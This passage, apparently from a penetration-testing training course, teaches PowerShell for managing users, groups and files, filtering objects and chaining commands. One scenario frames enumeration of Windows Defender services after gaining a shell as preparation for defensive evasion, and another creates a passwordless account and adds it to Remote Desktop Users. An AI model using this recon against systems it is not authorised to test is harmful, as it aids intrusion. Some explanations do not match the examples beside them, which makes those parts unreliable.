Like most other things in PowerShell, we use the `get`, `new`, and `set` verbs to find, create and modify users and groups. If dealing with local users and groups, `localuser & localgroup` can accomplish this. For domain assets, `aduser & adgroup` does the trick. If we were not sure, we could always use the `Get-Command *user*` cmdlet to see what we have access to. Let us give a few of them a try.

#### Identifying Local Users
```powershell-session
PS C:\htb> Get-LocalUser  
  
Name               Enabled Description
----               ------- -----------
Administrator      False   Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
DLarusso           True    High kick specialist.
Guest              False   Built-in account for guest access to the computer/domain
sshd               True
```

`Get-LocalUser` will display the users on our host. These users only have access to this particular host. Let us say that we want to create a new local user named `JLawrence`. We can accomplish the task using `New-LocalUser`. If we are unsure of the proper syntax, please do not forget about the `Get-Help` Command.

#### Creating A New User
```powershell-session
PS C:\htb>  New-LocalUser -Name "JLawrence" -NoPassword

Name      Enabled Description
----      ------- -----------
JLawrence True
```

Above, we created the user `JLawrence` and did not set a password. So this account is active and can be logged in without a password. Depending on the version of Windows we are using, by not setting a Password, we are flagging to windows that this is a Microsoft live account, and it attempts to login in that manner instead of using a local password.

If we wish to modify a user, we could use the `Set-LocalUser` cmdlet. For this example, we will modify `JLawrence` and set a password and description on his account.

#### Modifying a User
```powershell-session
PS C:\htb> $Password = Read-Host -AsSecureString
****************
PS C:\htb> Set-LocalUser -Name "JLawrence" -Password $Password -Description "CEO EagleFang"
PS C:\htb> Get-LocalUser  

Name               Enabled Description
----               ------- -----------
Administrator      False   Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
demo               True
Guest              False   Built-in account for guest access to the computer/domain
JLawrence          True    CEO EagleFang
```

As for making and modifying users, it is as simple as what we see above. Now, let us move on to checking out groups. If it feels like a bit of an echo...well, it is. The commands are similar in use.

#### Get-LocalGroup
```powershell-session
PS C:\htb> Get-LocalGroup  

Name                                Description
----                                -----------
Access Control Assistance Operators Members of this group can remotely query authorization attr...
Administrators                      Administrators have complete and unrestricted access to the...
Backup Operators                    Backup Operators can override security restrictions for the...
Cryptographic Operators             Members are authorized to perform cryptographic operations.
Device Owners                       Members of this group can change system-wide settings.
```

In the output above, we ran the `Get-LocalGroup` cmdlet to get a printout of each group on the host. In the second command, we decided to inspect the `Users` group and see who is a member of said group. We did this with the `Get-LocalGroupMember` command. Now, if we wish to add another group or user to a group, we can use the `Add-LocalGroupMember` command. We will add `JLawrence` to the `Remote Desktop Users` group in the example below.

#### Adding a Member To a Group
```powershell-session
PS C:\htb> Add-LocalGroupMember -Group "Remote Desktop Users" -Member "JLawrence"
PS C:\htb> Get-LocalGroupMember -Name "Remote Desktop Users" 

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        DESKTOP-B3MFM77\JLawrence Local
```

After running the command, we checked the group membership and saw that our user was indeed added to the Remote Desktop Users group

### Managing Domain Users and Groups

Before we can access the cmdlets we need and work with Active Directory, we must install the `ActiveDirectory` PowerShell Module. If you installed the AdminToolbox, the AD module might already be on your host. If not, we can quickly grab the AD modules and get to work. One requirement is to have the optional feature `Remote System Administration Tools` installed. This feature is the only way to get the official ActiveDirectory PowerShell module. The edition in AdminToolbox and other Modules is repackaged, so use caution.

#### Installing RSAT
```powershell-session
PS C:\htb> Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online

Path          :  
Online        : True  
RestartNeeded : False  

```

The above command will install `ALL` RSAT features in the Microsoft Catalog. If we wish to stay lightweight, we can install the package named `Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0`. Now we should have the ActiveDirectory module installed. Let us check.

#### Locating The AD Module
```powershell-session
PS C:\htb> Get-Module -Name ActiveDirectory -ListAvailable 

    Directory: C:\Windows\system32\WindowsPowerShell\v1.0\Modules


ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAccount, Add-ADDomainControllerPasswordReplicationPolicy, Add-A...
```

Nice. Now that we have the module, we can get started with AD `User` and `Group` management. The easiest way to locate a specific user is by searching with the `Get-ADUser` cmdlet.

#### Get-ADUser
```powershell-session
PS C:\htb> Get-ADUser -Filter *

DistinguishedName : CN=user14,CN=Users,DC=greenhorn,DC=corp
Enabled           : True
GivenName         :
Name              : user14
ObjectClass       : user
ObjectGUID        : bef9787d-2716-4dc9-8e8f-f8037a72c3d9
SamAccountName    : user14
SID               : S-1-5-21-1480833693-1324064541-2711030367-1110
Surname           :
UserPrincipalName :
```

The parameter `-Filter *` lets us grab all users within Active Directory. Depending on our organization's size, this could produce a ton of output. We can use the `-Identity` parameter to perform a more specific search for a user by `distinguished name, GUID, the objectSid, or SamAccountName`.

We are going to search for the user `TSilver` now.
#### Get a Specific User
```powershell-session
PS C:\htb>  Get-ADUser -Identity TSilver


DistinguishedName : CN=TSilver,CN=Users,DC=greenhorn,DC=corp
Enabled           : True
GivenName         :
Name              : TSilver
ObjectClass       : user
ObjectGUID        : a19a6c8a-000a-4cbf-aa14-0c7fca643c37
SamAccountName    : TSilver
SID               : S-1-5-21-1480833693-1324064541-2711030367-1602
Surname           :
UserPrincipalName :
  
```

We can see from the output several pieces of information about the user, including:

- `Object Class`: which specifies if the object is a user, computer, or another type of object.
- `DistinguishedName`: Specifies the object's relative path within the AD schema.
- `Enabled`: Tells us if the user is active and can log in.
- `SamAccountName`: The representation of the username used to log into the ActiveDirectory hosts.
- `ObjectGUID`: Is the unique identifier of the user object.

Users have many different attributes ( not all shown here ) and can all be used to identify and group them. We could also use these to filter specific attributes. For example, let us filter the user's `Email address`.

#### Searching On An Attribute
```powershell-session
PS C:\htb> Get-ADUser -Filter {EmailAddress -like '*greenhorn.corp'}


DistinguishedName : CN=TSilver,CN=Users,DC=greenhorn,DC=corp
Enabled           : True
GivenName         :
Name              : TSilver
ObjectClass       : user
ObjectGUID        : a19a6c8a-000a-4cbf-aa14-0c7fca643c37
SamAccountName    : TSilver
SID               : S-1-5-21-1480833693-1324064541-2711030367-1602
Surname           :
UserPrincipalName :
```

In our output, we can see that we only had one result for a user with an email address matching our naming context `*greenhorn.corp`. This is just one example of attributes we can filter on. For a more detailed list, check out this [Technet Article](https://social.technet.microsoft.com/wiki/contents/articles/12037.active-directory-get-aduser-default-and-extended-properties.aspx), which covers the default and extended user object properties.

We need to create a new user for an employee named `Mori Tanaka` who just joined Greenhorn. Let us give the New-ADUser cmdlet a try.

#### New ADUser
```powershell-session
PS C:\htb> New-ADUser -Name "MTanaka" -Surname "Tanaka" -GivenName "Mori" -Office "Security" -OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true 

AccountPassword: ****************
PS C:\htb> Get-ADUser -Identity MTanaka -Properties * | Format-Table Name,Enabled,GivenName,Surname,Title,Office,Mail

Name    Enabled GivenName Surname Title  Office   Mail
----    ------- --------- ------- -----  ------   ----
MTanaka    True Mori      Tanaka  Sensei Security MTanaka@greenhorn.corp
```

Ok, a lot is going on here. It may look daunting but let us dissect it. The `first` portion of the output above is creating our user:

- `New-ADUser -Name "MTanaka"` : We issue the `New-ADUser` command and set the user's SamAccountName to `MTanaka`.
- `-Surname "Tanaka" -GivenName "Mori"`: This portion sets our user's `Lastname` and `Firstname`.
- `-Office "Security"`: Sets the extended property of `Office` to `Security`.
- `-OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"}`: Here we set other extended attributes such as `title` and `Email-Address`.
- `-Accountpassword (Read-Host -AsSecureString "AccountPassword")`: With this portion, we set the user's `password` by having the shell prompt us to enter a new password. (we can see it in the line below with the stars)
- `-Enabled $true`: We are enabling the account for use. The user could not log in if this was set to `\$False`.

The `second` is validating that the user we created and the properties we set exist:

- `Get-ADUser -Identity MTanaka -Properties *`: Here, we are searching for the user's properties `MTanaka`.
- `|` : This is the Pipe symbol. It will be explored more in another section, but for now, it takes our `output` from `Get-ADUser` and sends it into the following command.
- `Format-Table Name,Enabled,GivenName,Surname,Title,Office,Mail`: Here, we tell PowerShell to `Format` our results as a `table` including the default and extended properties listed.

Seeing the commands broken down like this helps demystify the strings. Now, what if we need to modify a user? `Set-ADUser` is our ticket. Many of the filters we looked at earlier apply here as well. We can change or set any of the attributes that were listed. For this example, let us add a `Description` to Mr. Tanaka.

#### hanging a Users Attributes
```powershell-session
PS C:\htb> Set-ADUser -Identity MTanaka -Description " Sensei to Security Analyst's Rocky, Colt, and Tum-Tum"  

PS C:\htb> Get-ADUser -Identity MTanaka -Property Description


Description       :  Sensei to Security Analyst's Rocky, Colt, and Tum-Tum
DistinguishedName : CN=MTanaka,CN=Users,DC=greenhorn,DC=corp
Enabled           : True
GivenName         : Mori
Name              : MTanaka
ObjectClass       : user
ObjectGUID        : c19e402d-b002-4ca0-b5ac-59d416166b3a
SamAccountName    : MTanaka
SID               : S-1-5-21-1480833693-1324064541-2711030367-1603
Surname           : Tanaka
UserPrincipalName :
```

## Why is Enumerating Users & Groups Important?

Users and groups provide a wealth of opportunities regarding Pentesting a Windows environment. We will often see users misconfigured. They may be given excessive permissions, added to unnecessary groups, or have weak/no passwords set. Groups can be equally as valuable. Often groups will have nested membership, allowing users to gain privileges they may not need. These misconfigurations can be easily found and visualized with Tools like [Bloodhound](https://github.com/BloodHoundAD/BloodHound). For a detailed look at enumerating Users and Groups, check out the [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) module.

---

### Working with Files and Directories - PowerShell

We already know how to navigate around the host and manage users and groups utilizing only PowerShell; now, it is time to explore files and directories. In this section, we will experiment with creating, modifying, and deleting files and directories, along with a quick introduction to file permissions and how to enumerate them. By now, we should be familiar with the `Get, Set, New` verbs, among others, so we will speed this up with our examples by combining several commands into a single shell session.

---
## Creating/Moving/Deleting Files & Directories

Many of the cmdlets we will discuss in this section can apply to working with files and folders, so we will combine some of our actions to work more efficiently (as any good pentester or sysadmin should strive to.). The table below lists the commonly used cmdlets used when dealing with objects in PowerShell.

#### Common Commands Used for File & Folder Management

|**Command**|**Alias**|**Description**|
|---|---|---|
|`Get-Item`|gi|Retrieve an object (could be a file, folder, registry object, etc.)|
|`Get-ChildItem`|ls / dir / gci|Lists out the content of a folder or registry hive.|
|`New-Item`|md / mkdir / ni|Create new objects. ( can be files, folders, symlinks, registry entries, and more)|
|`Set-Item`|si|Modify the property values of an object.|
|`Copy-Item`|copy / cp / ci|Make a duplicate of the item.|
|`Rename-Item`|ren / rni|Changes the object name.|
|`Remove-Item`|rm / del / rmdir|Deletes the object.|
|`Get-Content`|cat / type|Displays the content within a file or object.|
|`Add-Content`|ac|Append content to a file.|
|`Set-Content`|sc|overwrite any content in a file with new data.|
|`Clear-Content`|clc|Clear the content of the files without deleting the file itself.|
|`Compare-Object`|diff / compare|Compare two or more objects against each other. This includes the object itself and the content within.|

>**Scenario: Greenhorn's new Security Chief, Mr. Tanaka, has requested that a set of files and folders be created for him. He plans to use them for SOP documentation for the Security team. Since he just got host access, we have agreed to set the file & folder structure up for him. If you would like to follow along with the examples below, please feel free. For your practice, we removed the folders and files discussed below so you can take a turn recreating them.**

First, we are going to start with the folder structure he requested. We are going to make three folders named :

- `SOPs`
    - `Physical Sec`
    - `Cyber Sec`
    - `Training`

We will use the `Get-Item`, `Get-ChildItem`, and `New-Item` commands to create our folder structure. Let us get started. We first need to determine `where we are` in the host and then move to Mr. Tanaka's `Documents` folder.

```
PS C:\Users\MTanaka\Documents\SOPs> get-childitem
   Directory: C:\Users\MTanaka\Documents\SOPs

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         7/13/2025  11:26 AM                Cyber Sec
d-----         7/13/2025  11:26 AM                Physical Sec
d-----         7/13/2025  11:27 AM                Training
```

Now that we have our directory structure in place. It's time to start populating the files required. Mr. Tanaka asked for a Markdown file in each folder like so:

- `SOPs` > ReadMe.md
    - `Physical Sec` > Physical-Sec-draft.md
    - `Cyber Sec` > Cyber-Sec-draft.md
    - `Training` > Employee-Training-draft.md
      
In each file, he has requested this header at the top:

- Title: Insert Document Title Here
- Date: x/x/202x
- Author: MTanaka
- Version: 0.1 (Draft)

We should be able to quickly knock this out using the `New-Item` cmdlet and the `Add-Content` cmdlet.

```powershell-session
PS C:\htb> PS C:\Users\MTanaka\Documents\SOPs> new-Item "Readme.md" -ItemType File

    Directory: C:\Users\MTanaka\Documents\SOPs

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/10/2022   9:12 AM              0 Readme.md

PS C:\Users\MTanaka\Documents\SOPs> cd '.\Physical Sec\'
PS C:\Users\MTanaka\Documents\SOPs\Physical Sec> ls
PS C:\Users\MTanaka\Documents\SOPs\Physical Sec> new-Item "Physical-Sec-draft.md" -ItemType File

    Directory: C:\Users\MTanaka\Documents\SOPs\Physical Sec

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/10/2022   9:14 AM              0 Physical-Sec-draft.md

PS C:\Users\MTanaka\Documents\SOPs\Physical Sec> cd ..
PS C:\Users\MTanaka\Documents\SOPs> cd '.\Cyber Sec\'

PS C:\Users\MTanaka\Documents\SOPs\Cyber Sec> new-Item "Cyber-Sec-draft.md" -ItemType File

    Directory: C:\Users\MTanaka\Documents\SOPs\Cyber Sec

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/10/2022   9:14 AM              0 Cyber-Sec-draft.md
```

Now that we have our files, we need to add content inside them. We can do so with the `Add-Content` cmdlet.

#### Adding Content
```powershell-session
PS C:\htb> Add-Content .\Readme.md "Title: Insert Document Title Here
>> Date: x/x/202x
>> Author: MTanaka
>> Version: 0.1 (Draft)"  
  
PS C:\Users\MTanaka\Documents\SOPs> cat .\Readme.md
Title: Insert Document Title Here
Date: x/x/202x
Author: MTanaka
Version: 0.1 (Draft)
```

We would then perform this same process we did for `Readme.md` in every other file we created for Mr. Tanaka. This scenario felt a bit tedious, right? Creating files over and over by hand can get tiresome. This is where automation and scripting come into place. It is a bit out of reach right now, but in a later section in this module, we will discuss how to make a quick PowerShell Module, using variables and writing scripts to make things easier.

>**Scenario Cont.: Mr. Tanaka has asked us to change the name of the file `Cyber-Sec-draft.md` to `Infosec-SOP-draft.md`.**

We can quickly knock this task out using the `Rename-Item` cmdlet. Lets' give it a try:

#### Renaming An Object
```powershell-session
PS C:\Users\MTanaka\Documents\SOPs\Cyber Sec> ls

    Directory: C:\Users\MTanaka\Documents\SOPs\Cyber Sec

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/10/2022   9:14 AM              0 Cyber-Sec-draft.md

PS C:\Users\MTanaka\Documents\SOPs\Cyber Sec> Rename-Item .\Cyber-Sec-draft.md -NewName Infosec-SOP-draft.md
PS C:\Users\MTanaka\Documents\SOPs\Cyber Sec> ls

    Directory: C:\Users\MTanaka\Documents\SOPs\Cyber Sec

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/10/2022   9:14 AM              0 Infosec-SOP-draft.md
```

All we needed to do above was issue the `Rename-Item` cmdlet, give it the original filename we want to change (`Cyber-Sec-draft.md`), and then tell it our new name with the `-NewName` (`Infosec-SOP-draft.md`) parameter.

#### Files1-5.txt are on MTanaka's Desktop
```powershell-session
PS C:\Users\MTanaka\Desktop> ls

    Directory: C:\Users\MTanaka\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/13/2022   1:05 PM              0 file-1.txt
-a----        10/13/2022   1:05 PM              0 file-2.txt
-a----        10/13/2022   1:06 PM              0 file-3.txt
-a----        10/13/2022   1:06 PM              0 file-4.txt
-a----        10/13/2022   1:06 PM              0 file-5.txt

PS C:\Users\MTanaka\Desktop> get-childitem -Path *.txt | rename-item -NewName {$_.name -replace ".txt",".md"}
PS C:\Users\MTanaka\Desktop> ls

    Directory: C:\Users\MTanaka\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/13/2022   1:05 PM              0 file-1.md
-a----        10/13/2022   1:05 PM              0 file-2.md
-a----        10/13/2022   1:06 PM              0 file-3.md
-a----        10/13/2022   1:06 PM              0 file-4.md
-a----        10/13/2022   1:06 PM              0 file-5.md
```

As we can see above, we had five text files on the Desktop. We changed them to `.md` files using `get-childitem -Path *.txt` to select the objects and used `|` to send those objects to the `rename-item -NewName {$_.name -replace ".txt",".md"}` cmdlet which renames everything from its original name ($_.name) and replaces the `.txt` from name to `.md`. This is a much faster way to interact with files and perform bulk actions. Now that we have completed all of Mr. Tanakas' requests, let us discuss File and Directory permissions for a second.

## What are File & Directory Permissions

Permissions, simplified, are our host's way of determining who has access to a specific object and what they can do with it. These permissions allow us to apply granular security control over our objects to maintain a proper security posture. In environments like large organizations with multiple departments (like HR, IT, Sales, etc.), want to ensure they keep information access on a "need to know" basis. This ensures that an outsider cannot corrupt or misuse the data. The Windows file system has many basic and advanced permissions. Some of the key permission types are:

#### Permission Types Explained

- `Full Control`: Full Control allows for the user or group specified the ability to interact with the file as they see fit. This includes everything below, changing the permissions, and taking ownership of the file.
- `Modify`: Allows reading, writing, and deleting files and folders.
- `List Folder Contents`: This makes viewing and listing folders and subfolders possible along with executing files. This only applies to `folders`.
- `Read and Execute`: Allows users to view the contents within files and run executables (.ps1, .exe, .bat, etc.)
- `Write`: Write allows a user the ability to create new files and subfolders along with being able to add content to files.
- `Read`: Allows for viewing and listing folders and subfolders and viewing a file's contents.
- `Traverse Folder`: Traverse allows us to give a user the ability to access files or subfolders within a tree but not have access to the higher-level folder's contents. This is a way to provide selective access from a security perspective.
  
  Windows ( NTFS, in general ) allows us to set permissions on a parent directory and have those permissions populate each file and folder located within that directory. This saves us a ton of time compared to manually setting the permissions on each object contained within. This inheritance can be disabled as necessary for specific files, folders, and sub-folders. If done, we will have to set the permissions we want on the affected files manually. Working with permissions can be a complex task and a bit much to do just from the CLI, so we will leave playing with permissions to the `Windows Fundamentals Module`.

---

Working with Files and Directories is straightforward, even if sometimes a bit tedious. Moving forward, we will add another layer to our CLI foundation and look at how we can `find` and `filter` content within files on the host.

---

###  Finding & Filtering Content

This section will dive into specifics of how PowerShell utilizes `Objects`, how we can `filter` based on `Properties` and `content`, and describe components like the PowerShell `Pipeline` further.

#### Explanation of PowerShell Output (Objects Explained)

 In PowerShell, everything is an `Object`. However, what is an object? Let us examine this concept further:

`What is an Object?` An `object` is an `individual` instance of a `class` within PowerShell. Let us use the example of a computer as our object. The total of everything (parts, time, design, software, etc.) makes a computer a computer.

`What is a Class?` A class is the `schema` or 'unique representation of a thing (object) and how the sum of its `properties` define it. The `blueprint` used to lay out how that computer should be assembled and what everything within it can be considered a Class.

`What are Properties?` Properties are simply the `data` associated with an object in PowerShell. For our example of a computer, the individual `parts` that we assemble to make the computer are its properties. Each part serves a purpose and has a unique use within the object.

`What are Methods?` Simply put, methods are all the functions our object has. Our computer allows us to process data, surf the internet, learn new skills, etc. All of these are the methods for our object.


### Finding and Filtering Objects
Let us look at this through a `user object` context. A user can do things like access files, run applications, and input/output data. But what is a user? What is it made up of?

#### Get an Object (User) and its Properties/Methods
```powershell-session
PS C:\htb> Get-LocalUser administrator | get-member

   TypeName: Microsoft.PowerShell.Commands.LocalUser

Name                   MemberType Definition
----                   ---------- ----------
Clone                  Method     Microsoft.PowerShell.Commands.LocalUser Clone()
Equals                 Method     bool Equals(System.Object obj)
GetHashCode            Method     int GetHashCode()
GetType                Method     type GetType()
ToString               Method     string ToString()
```

Now that we can see all of a user's properties let us look at what those properties look like when output by PowerShell. The [Select-Object](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-object?view=powershell-7.2) cmdlet will help us achieve this. In this manner, we now understand what makes up a user object.

#### Property Output (All)
```powershell-session
PS C:\htb> Get-LocalUser administrator | Select-Object -Property *


AccountExpires         :
Description            : Built-in account for administering the computer/domain
Enabled                : False
FullName               :
PasswordChangeableDate :
PasswordExpires        :
UserMayChangePassword  : True
PasswordRequired       : True
PasswordLastSet        :
LastLogon              : 1/20/2021 5:39:14 PM
Name                   : Administrator
SID                    : S-1-5-21-3916821513-3027319641-390562114-500
PrincipalSource        : Local
ObjectClass            : User
```

A user is a small object realistically, but it can be a lot to look at the output in this manner, especially from items like large `lists` or `tables`. So what if we wanted to filter this content down or show it to us in a more precise manner? We could filter out the properties of an object we do not want to see by selecting the few we do. Let's look at our users and see which have set a password recently.

#### Filtering on Properties
```powershell-session
PS C:\htb> Get-LocalUser * | Select-Object -Property Name,PasswordLastSet

Name               PasswordLastSet
----               ---------------
Administrator
DefaultAccount
Guest
MTanaka              1/27/2021 2:39:55 PM
WDAGUtilityAccount 1/18/2021 7:40:22 AM
```

We can also `sort` and `group` our objects on these properties.

#### Sorting and Grouping
```powershell-session
PS C:\htb> Get-LocalUser * | Sort-Object -Property Name | Group-Object -property Enabled

Count Name                      Group
----- ----                      -----
    4 False                     {Administrator, DefaultAccount, Guest, WDAGUtilityAccount}
    1 True                      {MTanaka}
```

We utilized the `Sort-Object` and `Group-Object` cmdlets to find all users, `sort` them by `name`, and then `group` them together based on their `Enabled` property. From the output, we can see that several users are disabled and not in use for interactive logon. This is just a quick example of what can be done with PowerShell objects and the sheer amount of information stored within each object.


### Why Do We Need to Filter our Results?

#### Too Much Output
```powershell-session
PS C:\htb> Get-Service | Select-Object -Property *

Name                : AarSvc_1ca8ea
RequiredServices    : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
DisplayName         : Agent Activation Runtime_1ca8ea
DependentServices   : {}
MachineName         : .
ServiceName         : AarSvc_1ca8ea
ServicesDependedOn  : {}
ServiceHandle       :
Status              : Stopped
ServiceType         : 224
StartType           : Manual
Site                :
Container           :

Name                : AdobeARMservice
RequiredServices    : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : True
DisplayName         : Adobe Acrobat Update Service
DependentServices   : {}
MachineName         : .
ServiceName         : AdobeARMservice
ServicesDependedOn  : {}
ServiceHandle       :
Status              : Running
ServiceType         : Win32OwnProcess
StartType           : Automatic
Site                :
Container           :

Name                : agent_ovpnconnect
RequiredServices    : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : True
DisplayName         : OpenVPN Agent agent_ovpnconnect
DependentServices   : {}
MachineName         : .
ServiceName         : agent_ovpnconnect
ServicesDependedOn  : {}
ServiceHandle       :
Status              : Running
ServiceType         : Win32OwnProcess
StartType           : Automatic
Site                :
Container           :

<SNIP>
```

This is way too much data to sift through, right? Let us break it down further and format this data as a list. We can use the command string `get-service | Select-Object -Property DisplayName,Name,Status | Sort-Object DisplayName | fl` to change our output like so:

```powershell-session
PS C:\htb> get-service | Select-Object -Property DisplayName,Name,Status | Sort-Object DisplayName | fl 

<SNIP>
DisplayName : ActiveX Installer (AxInstSV)
Name        : AxInstSV
Status      : Stopped

DisplayName : Adobe Acrobat Update Service
Name        : AdobeARMservice
Status      : Running

DisplayName : Adobe Genuine Monitor Service
Name        : AGMService
Status      : Running
<SNIP>
```

This is still a ton of output, but it is a bit more readable.

What if we wanted to determine if a specific service was running, but we needed to figure out the specific Name? The [Where-Object](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.2) can evaluate objects passed to it and their specific property values to look for the information we require. Consider this `scenario`:

>**Scenario: We have just landed an initial shell on a host via an unsecured protocol exposing the host to the world. Before we get any further in, we need to assess the host and determine if any defensive services or applications are running. First, we look for any instance of `Windows Defender` services running.**

Using `Where-Object` (`where` as an alias) and the parameter matching with `-like` will allow us to determine if we are safe to continue by looking for anything with "`Defender`" in the property. In this instance, we check the `DisplayName` property of all objects retrieved by `Get-Service`.

#### Hunting for Windows Defender
```powershell-session
PS C:\htb>  Get-Service | where DisplayName -like '*Defender*'

Status   Name               DisplayName
------   ----               -----------
Running  mpssvc             Windows Defender Firewall
Stopped  Sense              Windows Defender Advanced Threat Pr...
Running  WdNisSvc           Microsoft Defender Antivirus Networ...
Running  WinDefend          Microsoft Defender Antivirus Service
```

As we can see, our results returned `several services running`, including Defender Firewall, Advanced Threat Protection, and more. This is both good news and bad news for us. We cannot just dive in and start doing things because we are likely to be spotted by the defensive services, but it is good that we spotted them and can now regroup and make a plan for defensive evasion actions to be taken.

### The Evaluation of Values

`Where` and many other cmdlets can `evaluate` objects and data based on the values those objects and their properties contain. The output above is an excellent example of this utilizing the `-like` Comparison operator. It will look for anything that matches the values expressed and can include wildcards such as `*`. Below is a quick list (not all-encompassing) of other useful expressions we can utilize:

#### Comparison Operators

|**Expression**|**Description**|
|---|---|
|`Like`|Like utilizes wildcard expressions to perform matching. For example, `'*Defender*'` would match anything with the word Defender somewhere in the value.|
|`Contains`|Contains will get the object if any item in the property value matches exactly as specified.|
|`Equal` to|Specifies an exact match (case sensitive) to the property value supplied.|
|`Match`|Is a regular expression match to the value supplied.|
|`Not`|specifies a match if the property is `blank` or does not exist. It will also match `$False`.|
Of course, there are many other [comparison operators](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_comparison_operators?view=powershell-7.2) we can use like, greater than, less than, and negatives like NotEqual, but in this kind of searching they may not be as widely used. Now with a `-GTE` understanding of how these operators can help us more than before (see what I did there), let us get back to digging into Defender services. Now we will look for service objects with a `DisplayName` again, like < something>Defender< something>.

#### Defender Specifics
```powershell-session
PS C:\htb> Get-Service | where DisplayName -like '*Defender*' | Select-Object -Property *

Name                : mpssvc
RequiredServices    : {mpsdrv, bfe}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
DisplayName         : Windows Defender Firewall
DependentServices   :
MachineName         : .
ServiceName         : mpssvc
ServicesDependedOn  : {mpsdrv, bfe}
ServiceHandle       :
Status              : Running
ServiceType         : Win32ShareProcess
StartType           : Automatic
Site                :
Container           :

Name                : Sense
RequiredServices    : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
DisplayName         : Windows Defender Advanced Threat Protection Service
<SNIP>
```

Our results above now filter out every service associated with `Windows Defender` and displays the complete properties list of each match. Now we can look at the services, determine if they are running, and even if we can, at our current permission level, affect the status of those services (turn them off, disable them, etc.). During many of the commands we have issued in the last few sections, we have used the `|` symbol to concatenate multiple commands we would usually issue separately. Below we will discuss what this is and how it works for us.

---

## What is the PowerShell Pipeline? ( | )

In its simplest form, the [Pipeline](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pipelines?view=powershell-7.2) in PowerShell provides the end user a way to chain commands together. This chain is called a Pipeline and is also referred to as a pipe or piping commands together. With PowerShell handling objects the way it does, we can issue a command and then pipe (`|`) the resultant object output to another command for action.

#### Piping Commands
```powershell-session
PS C:\htb> Command-1 | Command-2 | Command-3

Output from the result of 1+2+3  
```

#### Using the Pipeline to Count Unique Instances
```powershell-session
PS C:\htb> get-process | sort | unique | measure-object

Count             : 113  
```
As a result, the pipeline output the total count (`113`) of unique processes running at that time. Suppose we break the pipeline down at any particular point. In that case, we may see the process output sorted, filtered for unique instances (no duplicate names), or just a number output from the `Measure-Object` cmdlet.


### Pipeline Chain Operators ( `&&` and `||` )
_Currently, Windows PowerShell 5.1 and older do not support Pipeline Chain Operators used in this fashion. If you see errors, you must install PowerShell 7 alongside Windows PowerShell. They are not the same thing._

You can find a great example of installing PowerShell 7 [here](https://www.thomasmaurer.ch/2019/07/how-to-install-and-update-powershell-7/) so that you can use many of the new and updated features. PowerShell allows us to have conditional execution of pipelines with the use of `Chain operators`. These operators ( `&&` and `||` ) serve two main functions:

- `&&`: Sets a condition in which PowerShell will execute the next command inline `if` the current command `completes properly`.
    
- `||`: Sets a condition in which PowerShell will execute the following command inline `if` the current command `fails`.
  
These operators can be useful in helping us set conditions for scripts that execute if a goal or condition is met. For example:

>**Scenario:** Let's say we write a command chain where we want to get the content within a file and then ping a host. We can set this to ping the host if the initial command succeeds with `&&` or to run only if the command fails `||`. Let's see both.

In this output, we can see that both commands were `successful` in execution because we get the output of the file `test.txt` printed to the console along with the results of our `ping` command.

#### Successful Pipeline
```powershell-session
PS C:\htb> Get-Content '.\test.txt' && ping 8.8.8.8
pass or fail

Pinging 8.8.8.8 with 32 bytes of data:
Reply from 8.8.8.8: bytes=32 time=23ms TTL=118
Reply from 8.8.8.8: bytes=32 time=28ms TTL=118
Reply from 8.8.8.8: bytes=32 time=28ms TTL=118
Reply from 8.8.8.8: bytes=32 time=21ms TTL=118

Ping statistics for 8.8.8.8:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 21ms, Maximum = 28ms, Average = 25ms
```

With this output, we can see that our pipeline `closed` itself after the `first` command since it executed adequately, printing the output of the file to the console.

#### Stop Unless Failure
```powershell-session
PS C:\htb>  Get-Content '.\test.txt' || ping 8.8.8.8

pass or fail
```

Here we can see that our pipeline executed `completely`. Our first command `failed` because the filename was typed wrong, and PowerShell sees this as the file we requested does not exist. Since the first command failed, our second command was executed.

#### Success in Failure
```powershell-session
PS C:\htb> Get-Content '.\testss.txt' || ping 8.8.8.8

Get-Content: Cannot find path 'C:\Users\MTanaka\Desktop\testss.txt' because it does not exist.

Pinging 8.8.8.8 with 32 bytes of data:
Reply from 8.8.8.8: bytes=32 time=20ms TTL=118
Reply from 8.8.8.8: bytes=32 time=37ms TTL=118
Reply from 8.8.8.8: bytes=32 time=19ms TTL=118

<SNIP>
```

The `pipeline` and `operators` that we used are beneficial to us from a time-saving perspective, as well as being able to quickly feed objects and data from one task to another. Issuing multiple commands in line is much more effective than manually issuing each command.

#### Finding Data within Content
Some tools exist, like `Snaffler`, `Winpeas`, and the like, that can search for interesting files and strings but what if we cannot bring a new tool onto the host? How do we hunt for sensitive info?

